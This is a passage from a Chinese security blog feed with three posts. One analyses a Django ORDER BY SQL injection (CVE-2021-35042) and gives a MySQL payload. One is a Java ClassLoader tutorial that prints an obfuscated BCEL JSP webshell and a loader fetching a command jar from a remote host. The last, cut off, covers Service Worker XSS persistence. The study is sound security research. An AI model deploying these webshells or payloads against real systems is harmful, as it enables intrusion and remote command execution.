&#39;pk&#39;:                name &#x3D; opts.pk.name​            field &#x3D; None            filtered_relation &#x3D; None            try:                field &#x3D; opts.get_field(name)            except FieldDoesNotExist:                if name in self.annotation_select:                    field &#x3D; self.annotation_select[name].output_field                elif name in self._filtered_relations and pos &#x3D;&#x3D; 0:                    filtered_relation &#x3D; self._filtered_relations[name]                    field &#x3D; opts.get_field(filtered_relation.relation_name)            if field is not None:                # Fields that contain one-to-many relations with a generic                # model (like a GenericForeignKey) cannot generate reverse                # relations and therefore cannot be used for reverse querying.                if field.is_relation and not field.related_model:                    raise FieldError(                        &quot;Field %r does not generate an automatic reverse &quot;                        &quot;relation and therefore cannot be used for reverse &quot;                        &quot;querying. If it is a GenericForeignKey, consider &quot;                        &quot;adding a GenericRelation.&quot; % name                    )                try:                    model &#x3D; field.model._meta.concrete_model                except AttributeError:                    # QuerySet.annotate() may introduce fields that aren&#39;t                    # attached to a model.                    model &#x3D; None            else:                # We didn&#39;t find the current field, so move position back                # one step.                pos -&#x3D; 1                if pos &#x3D;&#x3D; -1 or fail_on_missing:                    available &#x3D; sorted([                        *get_field_names_from_opts(opts),                        *self.annotation_select,                        *self._filtered_relations,                    ])                    raise FieldError(&quot;Cannot resolve keyword &#39;%s&#39; into field. &quot;                                     &quot;Choices are: %s&quot; % (name, &quot;, &quot;.join(available)))                break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>get_field</code>函数的意思是返回一个字段名称的字段实例。对应的表内字段名和字段实例的字典类型。其中<code>_forward_fields_map</code>和<code>fields_map</code>的作用是相同的，就是后者还会检查一些内部的其他字段。</p><pre class="line-numbers language-none"><code class="language-none">def get_field(self, field_name):        &quot;&quot;&quot;        Return a field instance given the name of a forward or reverse field.        &quot;&quot;&quot;        try:            # In order to avoid premature loading of the relation tree            # (expensive) we prefer checking if the field is a forward field.            return self._forward_fields_map[field_name]        except KeyError:            # If the app registry is not ready, reverse fields are            # unavailable, therefore we throw a FieldDoesNotExist exception.            if not self.apps.models_ready:                raise FieldDoesNotExist(                    &quot;%s has no field named &#39;%s&#39;. The app cache isn&#39;t ready yet, &quot;                    &quot;so if this is an auto-created related field, it won&#39;t &quot;                    &quot;be available yet.&quot; % (self.object_name, field_name)                )​        try:            # Retrieve field instance by name from cached or just-computed            # field map.            return self.fields_map[field_name]        except KeyError:            raise FieldDoesNotExist(&quot;%s has no field named &#39;%s&#39;&quot; % (self.object_name, field_name))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后都不存在的情况下会告知，<code>User has no field named name4</code>。</p><p>当然如果是存在的字段，比如name，程序从get_field获取到的field就是<code>cve_orderby.User.name</code>。也就是不管传入的参数是否正常，只要走了<code>names_to_path</code>最后都会返回不存在字段或者存在的字段实例对象，而不是拼接SQL去执行，那么至少在这里就不能造成SQL注入了。整个执行的代码都为：<code>SELECT &quot;cve_orderby_user&quot;.&quot;id&quot;, &quot;cve_orderby_user&quot;.&quot;name&quot; FROM &quot;cve_orderby_user&quot;</code>。</p><p>在查了一堆资料发现这个问题其实是绕过<code>names_to_path</code>这个判断，在函数<code>add_ordering</code>中，主要有五个判断：</p><ol><li>字段中是否带点，带的话提示传入的是原始列的别名，并警告不建议这么使用。</li><li>字段是否为问号。</li><li>字段开头是否为短横杠。</li><li>判断是否在一个map字典里，暂时也不知道是干啥的。</li><li>判断是否有额外的参数信息。</li></ol><p>所以，此处我们传一个带点的参数，比如<code>name.name</code>。到<code>add_ordering</code>中的时候，走到这个函数上，由于存在continue的作用，将跳过后续的判断，也就是不在进行<code>names_to_path</code>，无法获取字段的实例对象。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210806144834728.png" alt="image-20210806144834728"></p><p>后续进入_fetch_all的时候就已经生成SQL：<code>SELECT &quot;cve_orderby_user&quot;.&quot;id&quot;, &quot;cve_orderby_user&quot;.&quot;name&quot; FROM &quot;cve_orderby_user&quot; ORDER BY (&quot;name&quot;.name) ASC</code>。也就是把参数name.name拼接进去。</p><p>于是构造一条语句，注意这里使用的是MySQL数据库。构造：<code>SELECT cve_orderby_user.id, cve_orderby_user.name FROM cve_orderby_user ORDER BY (cve_orderby_user.name);select updatexml(1,concat(0x7e,(select @@version)),1);#) ASC</code></p><p>只需要传输参数：<code>cve_orderby_user.name);select updatexml(1,concat(0x7e,(select @@version)),1);#</code><br><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210806155634807.png" alt="image-20210806155634807"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CVE-2021-35042-Django-SQL注入&quot;&gt;&lt;a href=&quot;#CVE-2021-35042-Django-SQL注入&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-35042 Django SQL注入&quot;&gt;&lt;/a&gt;CVE-2
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>ClassLoader</title>
    <link href="https://misakikata.github.io/2021/07/ClassLoader/"/>
    <id>https://misakikata.github.io/2021/07/ClassLoader/</id>
    <published>2021-07-30T10:45:52.000Z</published>
    <updated>2021-07-30T10:45:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>一切的Java类都必须经过JVM加载后才能运行，而ClassLoader的主要作用就是Java类文件的加载。在JVM类加载器中最顶层的是<code>Bootstrap ClassLoader</code>(引导类加载器)、<code>Extension ClassLoader</code>(扩展类加载器)、<code>App ClassLoader</code>(系统类加载器)，<code>AppClassLoader</code>是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用<code>AppClassLoader</code>加载类，<code>ClassLoader.getSystemClassLoader()</code>返回的系统类加载器也是<code>AppClassLoader</code>。</p><p>我们在尝试获取被<code>Bootstrap ClassLoader</code>类加载器所加载的类的ClassLoader时候都会返回null。</p><p>ClassLoader类有如下核心方法：</p><pre class="line-numbers language-none"><code class="language-none">loadClass(加载指定的Java类)findClass(查找指定的Java类)findLoadedClass(查找JVM已经加载过的类)defineClass(定义一个Java类)resolveClass(链接指定的Java类)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Java类动态加载方式"><a href="#Java类动态加载方式" class="headerlink" title="Java类动态加载方式"></a>Java类动态加载方式</h3><p>静态加载</p><p>Office.java</p><pre class="line-numbers language-none"><code class="language-none">class Office&#123;    public static void main(String[] args)&#123;        if(args[0].equals(&quot;Word&quot;))&#123;            Word w &#x3D; new Word();            w.start();        &#125;        if(args[0].equals(&quot;Excel&quot;))&#123;            Excel e &#x3D; new Excel();            e.start();        &#125;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Word.java</p><pre class="line-numbers language-none"><code class="language-none">class Word&#123;    public void start()&#123;        System.out.println(&quot;Word Start&quot;);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>编译会报错，这当然没问题，因为确实没有写Excel.java类。如果修改为动态加载，动态加载类是按需加载的，你需要什么类，就加载什么类，一个类的状态，不会影响到另一个类的使用。</p><p>所以我们可以将Office类改造如下：</p><pre class="line-numbers language-none"><code class="language-none">class Office&#123;    public static void main(String[] args)&#123;        try&#123;            Class c &#x3D; Class.forName(args[0]);            Word w &#x3D; (Word)c.newInstance();            w.start();        &#125;        catch(Exception e)&#123;            e.printStackTrace();        &#125;            &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然我们还是没有写Excel类，但此时我们再编译Office.java文件，编译通过；成功按照我们预想的结果运行，这样Word类就可以单独运行。</p><h3 id="常用的类动态加载方式"><a href="#常用的类动态加载方式" class="headerlink" title="常用的类动态加载方式"></a>常用的类动态加载方式</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 反射加载TestHelloWorld示例Class.forName(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;);​&#x2F;&#x2F; ClassLoader加载TestHelloWorld示例this.getClass().getClassLoader().loadClass(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Class.forName(“类名”)默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用Class.forName(“类名”, 是否初始化类, 类加载器)，而ClassLoader.loadClass默认不会初始化类方法。</p><h3 id="Class加载器调用顺序"><a href="#Class加载器调用顺序" class="headerlink" title="Class加载器调用顺序"></a><strong>Class加载器调用顺序</strong></h3><p>加载class文件分为三个阶段：</p><ol><li>第一阶段找到class文件并将或者文件包含的字节码加载到内存，至于如何找到class文件就是通过<code>findClass()</code>方法定义的，找到之后通过<code>defineClass()</code>方法来创建类对象</li><li>第二阶段分为三个步骤（验证，准备，解析）：字节码验证，Class类数据结构分析以及相应的内存分配，符号表链接</li><li>第三个阶段将类中的静态属性和初始化赋值，以及静态代码块的执行</li></ol><p>加载器顺序：</p><pre class="line-numbers language-none"><code class="language-none">public class Test &#123;    public static void main(String[] args) &#123;        ClassLoader classLoader &#x3D; Test.class.getClassLoader();        System.out.println(classLoader);                ClassLoader classLoader1 &#x3D; classLoader.getParent();        System.out.println(classLoader1);                ClassLoader classLoader2 &#x3D; classLoader1.getParent();        System.out.println(classLoader2);     &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>能得到这么一个结果：</p><pre class="line-numbers language-none"><code class="language-none">sun.misc.Launcher$AppClassLoader@18b4aac2sun.misc.Launcher$ExtClassLoader@677327b6null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>第一次调用的时候得到的是AppClassLoader，应用程序加载器，在没有明确指定的时候就是默认加载应用程序内类库加载器。</p><p>第二次调用的时候得到的是ExtClassLoader。扩展类加载器，是AppClassLoader加载器的父类加载器，至于null是bootstrap加载器的返回，这个加载器没有明确的引用。</p><h3 id="双亲委派"><a href="#双亲委派" class="headerlink" title="双亲委派"></a>双亲委派</h3><p><strong>Bootstrap Class Loader</strong></p><p>这个类加载器负责加载存放在<code>&lt;JAVA_HOME&gt;\lib</code>目录，或者被<code>-Xbootclasspath</code>参数所指定的路径中存放的，而且是Java虚拟机能够识别的(按照文件名识别，如rt.jar、tools.jar，名字不符合的类库即使放在lib目录中也不会被加载)类库加载到虚拟机的内存中。</p><p><strong>Extension Class Loader</strong></p><p>它负责加载<code>&lt;JAVA_HOM E&gt;\lib\ext</code>目录中，或者被<code>java.ext.dirs</code>系统变量所 指定的路径中所有的类库。<strong>注意，扩展类加载器加载的必须是jar或者zip文件，不能是.class文件</strong>。</p><p><strong>App Class Loader</strong></p><p>这个类加载器由<code>sun.misc.Launcher$AppClassLoader</code>来实现。由于应用程序类加载器是ClassLoader类中的<code>getSystemClassLoader()</code>方法的返回值，所以也称它为“系统类加载器”。它负责加载用户类路径(ClassPath)上所有的类库，开发者同样可以直接在代码中使用这个类加载器</p><p>双亲委派工作原理：类加载器接收加载类的请求后，并不会自己去主动加载类，而是委派给父类加载器来加载，只要在父类加载器无法加载后才由子类加载器加载。也就是所有的加载请求都会反馈给最顶层的加载器中。加载器的子父类关系</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/49750813-d1f56c80-fce6-11e8-8750-a2b0beb24a0d.png" alt="image"></p><p>双亲委派模型的好处就是同一个名称的类只能在一个类加载器中加载一次，避免多次加载导致混乱。</p><h3 id="破坏双亲委派"><a href="#破坏双亲委派" class="headerlink" title="破坏双亲委派"></a>破坏双亲委派</h3><p>如果双亲委派是父类加载器来搜索加载，那自然在某些环境下并不希望由父类来加载，所以这时候就需要重写loadClass方法来破坏双亲委派的加载逻辑。ClassLoader默认构造方法设置了父类加载器为系统加载器，loadClass方法实现了委托模型，我们只需要重写findClass方法实现自己的类加载逻辑，比如javadoc给的一个例子：</p><pre class="line-numbers language-none"><code class="language-none">protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;    byte[] b &#x3D; loadClassData(name);    return defineClass(name, b, 0, b.length);&#125;private byte[] loadClassData(String name) &#123;    &#x2F;&#x2F; load the class data from the file or network&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实现大体上分为两步，第一步获取字节码的字节数组byte[]，然后通过ClassLoader提供的<code>defineClass</code>方法将字节码定义成Class对象。但是以上这种重写的方式并不破坏双亲委派机制，只是自定义类加载器，在双亲委派的基础上，实现自己需要的部分方法，后续还是采用重写loadClass的方式。</p><p>先来看一下loadClass的源代码实现：</p><pre class="line-numbers language-none"><code class="language-none">protected Class&lt;?&gt; loadClass(String name, boolean resolve)  throws ClassNotFoundException &#123;  synchronized (getClassLoadingLock(name)) &#123;    &#x2F;&#x2F; First, check if the class has already been loaded    Class&lt;?&gt; c &#x3D; findLoadedClass(name);    if (c &#x3D;&#x3D; null) &#123;      long t0 &#x3D; System.nanoTime();      try &#123;        if (parent !&#x3D; null) &#123;          c &#x3D; parent.loadClass(name, false);        &#125; else &#123;          c &#x3D; findBootstrapClassOrNull(name);        &#125;      &#125; catch (ClassNotFoundException e) &#123;        &#x2F;&#x2F; ClassNotFoundException thrown if class not found        &#x2F;&#x2F; from the non-null parent class loader      &#125;​      if (c &#x3D;&#x3D; null) &#123;        &#x2F;&#x2F; If still not found, then invoke findClass in order        &#x2F;&#x2F; to find the class.        long t1 &#x3D; System.nanoTime();        c &#x3D; findClass(name);​        &#x2F;&#x2F; this is the defining class loader; record the stats        sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);        sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);        sun.misc.PerfCounter.getFindClasses().increment();      &#125;    &#125;    if (resolve) &#123;      resolveClass(c);    &#125;    return c;  &#125;&#125;​<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先判断jvm是否已经加载了，没有的话判断是否还有父类，有的话去父类加载，没有的话说明是最顶层的类，直接在BootstraploadClass中查找加载，如果依然没有，则返回null，到最后由当前子类加载器加载。</p><p>想破坏委派需要不让他去父类加载，或者我们自定义父类加载的流程。例如：</p><pre class="line-numbers language-none"><code class="language-none">public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123;    Class&lt;?&gt; c &#x3D; findLoadedClass(name);    if (c !&#x3D; null) &#123;        return c;    &#125;    Class&lt;?&gt; classname &#x3D; null;    try &#123;        classname &#x3D; findClass(name);    &#125; catch (Exception e) &#123;&#125;    if (classname !&#x3D; null) &#123;        &#x2F;&#x2F;....        return findClass;    &#125;    return super.loadClass(name);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上是一个简单的重写，意思就是jvm如果找不到当前类，则调用findclass来加载此类。也就是去掉了到父类中查找加载的步骤而已。</p><h3 id="加载器加载shell"><a href="#加载器加载shell" class="headerlink" title="加载器加载shell"></a>加载器加载shell</h3><p>这种利用classload的来加载恶意代码从而实现webshell的方式，已经有很多实现了，比如：</p><p><a href="https://github.com/threedr3am/JSP-Webshells/blob/master/jsp/1/1.jsp">https://github.com/threedr3am/JSP-Webshells/blob/master/jsp/1/1.jsp</a></p><p>就是利用加载器来加载字节码实现webshell，还有冰蝎shell，同样是加载器实现。使用上面这个1.jsp来分析一下，当我们了解加载器后再看这个shell就简单一些</p><pre class="line-numbers language-none"><code class="language-none">&lt;%@ page import&#x3D;&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; %&gt;&lt;html&gt;&lt;body&gt;&lt;h2&gt;BCEL字节码的JSP Webshell&lt;&#x2F;h2&gt;&lt;%    String bcelCode &#x3D; &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85U$5bW$hU$U$fe$86$ML$Y$86B$93R$$Z$bcQ$hn$j$ad$b7Z$w$da$mT4$5c$84$W$a4x$9bL$Oa$e8d$sN$s$I$de$aa$fe$86$fe$87$beZ$97$86$$q$f9$e8$83$8f$fe$M$7f$83$cb$fa$9dI$I$89$84$e5$ca$ca$3es$f6$de$b3$f7$b7$bf$bd$cf$99$3f$fe$f9$e57$A$_$e3$7b$jC$98$d6$f0$a6$8e6$b9$be$a5$e1$86$8e4f$a4x$5b$c7$y$e6t$b4$e3$a6$O$V$efH1$_$j$df$8d$e3$3d$b9f$3a$d1$8b$F$N$8b$3a$96$b0$i$c7$fb$3aV$b0$aa$e3$WnK$b1$a6c$j$ltb$Dw$e2$d8$d4$f1$n$3e$d2$f0$b1$82X$mJ$K$S$99$jk$d72$5d$cb$cb$9b$aba$e0x$f9$v$F$j$d7$j$cf$J$a7$V$f4$a5N$9aG$d7$U$a83$7eN$u$e8$c98$9eX$y$X$b2$o$b8ee$5d$n$c3$f9$b6$e5$aeY$81$p$f75$a5$gn$3bL$a5g$d2$b6pgw$j$97$vbv$n$a7$a0$bb$U$c5L$97$j7$t$C$F$83$t$d2$d5L$7c$e3L$b6$bc$b5$r$C$91$5b$RV$e4$3cPuv$7c3$ddd$a1$af$ea$S$Y$c3$af$86$96$7dw$c1$wF$40$c8$90$86O$c82$J$s$9a$d9$3d$5b$UC$c7$f7J$g$3eU$Q$P$fdjF$F$e7R$a3$adXQ$L$96$e3$v8$9f$da$3c$85$U$x$c8$b3$ccd$L$b3$82$$$c7$x$96Cn$85U$m$afu$e8$f3$c7jz$b5g$f7C$d9$95$b6$cd4$e3$d9$R$c9$fa$aa_$Ol1$e7H$w$bb$8f$u$bc$y$D$Y$b8$AKA$ff$v$a4$Rkk$86Ht$8b$fcU$9b$86$ac$B$h9$D$C$5b$g$f2$G$b6$e1$c8D$3bR$dc5$e0$e2$8a$81$C$c8$84$a2$hxQ$ee$9e$c0$93$q$f0$I$9a$G$df$40$R$9f$b1eu$b4$b6k$95$c8s$60$a0$84PC$d9$c0$$$3e7$b0$87$7d$N_$Y$f8$S_i$f8$da$c07$b8$c7$40$p$p$e9$99$d9$cc$c8$88$86o$N$7c$87a$F$bd$c7$V$$ew$84$j6$a9$8e$fa$96$ac$X$b5To$$$t$z$r$9bs$f6$d8$7d$a5$ec$85NA2$9b$Xa$7d$d3$d7$d4$f4$9aZv$5d$ec$J$5b$c1$a5V$t$a1A$b5$i$f8$b6$u$95$a6$9a2$d5$94$q$82$99$e6$h$H$a0$ff$u$db$89$R$YH$b54$c8$g$92$c7$a6$da$a4Km$9c$f6$5c$s$9a$f7$O$abX$U$k$cf$d5$e4$ff$a0$fd$ef$d9$ea96$cd$c8NU$RG$8f$Z$bf61M$fc4$98$f8z_K$D$BK$82E$v$9a$df$h$a5$a3$daGO$Hw$82$8dd$L$b5$82N$w$j$b7z$b9$b0$bd$f3$ec$92$q$81$e7$t$b5$99$96$db$x$b6_0Ke$cf$f4$83$bci$V$z$7b$5b$98Y$ce$a2$e9x$a1$I$3c$cb5$a3$81$dc$e2$992o$87$8e$eb$84$fbdOx$d5$T$d7$cf$uwZ$5e$B$8dC$b7_$K$F$b1$c4$fcr$d8x$a0$97$e9$da$C$7f$83Z$81V$94$3b$d7$c33$bc$b9$87$f8$JP$f8$e7$n$a2$8c$f1$f9$C$86y$ad$3f$c5$dd$9f$e8$e0$bd$P$dc$i$3b$80r$88$b6$8d$D$c4$W$O$a1n$i$a2$7d$e3$R$3a$c6$x$d0$w$88$l$a0$f3$A$fa$e2d$F$5d$h$d7$d4$df$91$98$YT$x0$S$dd$U$eb$P$k$ff56Q$c1$99$9f$d1$f30J$f04$e504$ca$$$7eJ$M$fe$baq$R$3d0$Jf$g$J$cc$nI$60$f2$bb$U$a5$c6$b3x$O$88$9eF$IQ$a1$ff$U$fd$9f$t$c4$8b$b4$5dB$8a1$t$I$7f$94V$VcQ$vm$8fiT5$8ck$98$d00$a9$e12$f07$G$b8c$g$d0M$c1$L$fc$f3$f6$a0$94$95$9a$5c$r$L$edc$3f$a1$e7$H$3e$b4E8$3b$oe$7f$84$c7$a8$3a$d4$f0t$e2$r$o$ac$d2t$9f$IT$aeW$T$bd$V$9cM$q$wHfH$cd$b9_$e3$L$e3$y$bdo$7dB$7d$84$f3$8b$3f$a2$bf$c6ab$80$cc$90$$$83$bcT0$f8$b0$9eo$88$Z$r$fe$$$d6$92$60$p$G$c8$d40s$bcF$ab$c40V$cd$83W$f0j$c4$df$q$zW$89$xA$3e$5e$c75F$Zf$8c$v$be$jk$w$f4z$94$e1$8d$7f$BP$cbmH$f2$H$A$A&quot;;    response.getOutputStream().write(String.valueOf(new ClassLoader().loadClass(bcelCode).getConstructor(String.class).newInstance(request.getParameter(&quot;cmd&quot;)).toString()).getBytes());%&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用URLClassLoad远程加载webshell。如下园长给的一个Java连接代码。</p><pre class="line-numbers language-none"><code class="language-none">import java.io.*;import java.net.URL;import java.net.URLClassLoader;​public class classload extends ClassLoader &#123;​    public static void main(String[] args) &#123;        classload loader &#x3D; new classload();​        try &#123;            URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;192.168.30.179:8000&#x2F;cmd.jar&quot;);            URLClassLoader ucl &#x3D; new URLClassLoader(new URL[]&#123;url&#125;);            Class cmdClass &#x3D; ucl.loadClass(&quot;CMD&quot;);            Process process &#x3D; (Process) cmdClass.getMethod(&quot;exec&quot;, String.class).invoke(null, &quot;whoami&quot;);​            InputStream in &#x3D; process.getInputStream();            ByteArrayOutputStream baos &#x3D; new ByteArrayOutputStream();            byte[] buf &#x3D; new byte[2048];            int a &#x3D; 0;​            while ((a &#x3D; in.read(buf)) !&#x3D; -1) &#123;                baos.write(buf, 0, a);            &#125;            System.out.println(baos.toString());        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>jar文件，利用<code>jar -cvf cmd.jar cmd.class</code>来打包为一个jar文件。</p><pre class="line-numbers language-none"><code class="language-none">import java.io.IOException;​public class CMD &#123;    public static Process exec(String cmd) throws IOException &#123;        return Runtime.getRuntime().exec(cmd);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行运行后，就可以执行其中写入的命令，把这个代码改为jsp并且可以远程修改执行命令的代码</p><pre class="line-numbers language-none"><code class="language-none">&lt;%@ page import&#x3D;&quot;java.io.*, java.net.*&quot; %&gt;&lt;html&gt;&lt;body&gt;&lt;h2&gt;JSP Webshell&lt;&#x2F;h2&gt;&lt;%    URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;192.168.30.179:8000&#x2F;cmd.jar&quot;);    URLClassLoader ucl &#x3D; new URLClassLoader(new URL[]&#123;url&#125;);    Class cmdClass &#x3D; ucl.loadClass(&quot;CMD&quot;);    Process process &#x3D; (Process) cmdClass.getMethod(&quot;exec&quot;, String.class).invoke(null, request.getParameter(&quot;cmd&quot;));​    InputStream in &#x3D; process.getInputStream();    ByteArrayOutputStream baos &#x3D; new ByteArrayOutputStream();    byte[] buf &#x3D; new byte[2048];    int a &#x3D; 0;​    while ((a &#x3D; in.read(buf)) !&#x3D; -1) &#123;        baos.write(buf, 0, a);    &#125;response.getOutputStream().write(String.valueOf(baos.toString()).getBytes());%&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如下访问即可：<code>http://localhost:8080/jsp/1.jsp?cmd=whoami</code></p><p><a href="https://www.cnblogs.com/lz2017/p/13941248.html">深入分析ClassLoader工作机制</a></p><p><a href="http://seanthefish.com/2020/11/14/classloader-classpath-hell/index.html">classloader详解</a></p><p><a href="https://github.com/Sayi/sayi.github.com/issues/62">JVM(四)ClassLoader类加载机制</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一切的Java类都必须经过JVM加载后才能运行，而ClassLoader的主要作用就是Java类文件的加载。在JVM类加载器中最顶层的是&lt;code&gt;Bootstrap ClassLoader&lt;/code&gt;(引导类加载器)、&lt;code&gt;Extension ClassLoade
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>XSS持久化：Service Worker</title>
    <link href="https://misakikata.github.io/2021/06/XSS%E6%8C%81%E4%B9%85%E5%8C%96%EF%BC%9AService-Worker/"/>
    <id>https://misakikata.github.io/2021/06/XSS持久化：Service-Worker/</id>
    <published>2021-06-07T09:39:30.000Z</published>
    <updated>2021-06-07T09:39:30.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="service-worker"><a href="#service-worker" class="headerlink" title="service worker"></a>service worker</h2><p>service worker是一种特殊的web worker，web worker的作用是什么。</p><p>Web Worker为Web内容在后台线程中运行脚本提供了一种简单的方法。线程可以执行任务而不干扰用户界面。一旦创建， 一个worker 可以将消息发送到创建它的JavaScript代码, 通过将消息发布到该代码指定的事件处理程序（反之亦然）。</p><p>service worker是一个注册在指定源和路径下的事件驱动worker。它采用JavaScript控制关联的页面或者网站，拦截并修改访问和资源请求，细粒度地缓存资源。你可以完全控制应用在特定情形（最常见的情形是网络不可用）下的表现。</p><p>并且由于service worker工作于worker上下文，因此它不能访问DOM。线程独立于浏览器主线程，并且与当前的浏览器主线程完全隔离，并且可以用 JS 代码来拦截浏览器当前域的 HTTP 请求，故该特性为XSS的持久化实现提供了基础。</p><p>当然由于service worker的功能，出于安全考虑，有一些限制。</p><ol><li>只能注册同源下的js</li><li>网站必须是<code>https://</code>或者<code>http://localhost/</code></li><li>content-type 为 *&#x2F;javascript</li><li>Worker 线程不能获得下列对象：DOM对象，Windows对象，document对象，parent对象。</li></ol><h2 id="注册service-worker"><a href="#注册service-worker" class="headerlink" title="注册service worker"></a>注册service worker</h2><p>参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/ServiceWorkerContainer">https://developer.mozilla.org/zh-CN/docs/Web/API/ServiceWorkerContainer</a></p><h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><p>service worker的注册方式</p><pre class="line-numbers language-none"><code class="language-none">ServiceWorkerContainer.register(scriptURL, options)navigator.serviceWorker.register(scriptURL, options) #返回一个ServiceWorkerContainer对象。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>例如一个示例代码：</p><pre class="line-numbers language-none"><code class="language-none">if (&#39;serviceWorker&#39; in navigator) &#123;  navigator.serviceWorker.register(&#39;service-worker.js&#39;, &#123;scope: &#39;.&#x2F;&#39;&#125;)  .then(function(registration) &#123;    document.querySelector(&#39;#status&#39;).textContent &#x3D; &#39;succeeded&#39;;  &#125;).catch(function(error) &#123;    document.querySelector(&#39;#status&#39;).textContent &#x3D; error;  &#125;);&#125; else &#123;  &#x2F;&#x2F; The current browser doesn&#39;t support service workers.  let aElement &#x3D; document.createElement(&#39;a&#39;);  aElement.href &#x3D; &#96;     http:&#x2F;&#x2F;www.chromium.org&#x2F;blink&#x2F;serviceworker&#x2F;service-worker-faq  &#96;;  aElement.textContent &#x3D; &#39;unavailable&#39;;  document.querySelector(&#39;#status&#39;).appendChild(aElement);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="响应事件"><a href="#响应事件" class="headerlink" title="响应事件"></a>响应事件</h3><p>worker注册完成后，需要监听<code>fetch</code>事件来达到篡改返回，对页面嵌入恶意的srcipt脚本。</p><pre class="line-numbers language-none"><code class="language-none">self.addEventListener(&#39;fetch&#39;, function(event) &#123;&#x2F;&#x2F;worker context&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>利用<code>respondwith</code>来自定义返回的响应代码。其中包含<code>Response</code>对象的代码。</p><pre class="line-numbers language-none"><code class="language-none">function(e)&#123;    e.respondWith(        new Response(&#39;&lt;script&gt;alert(document.domain)&lt;&#x2F;script&gt;&#39;,            &#123;headers: 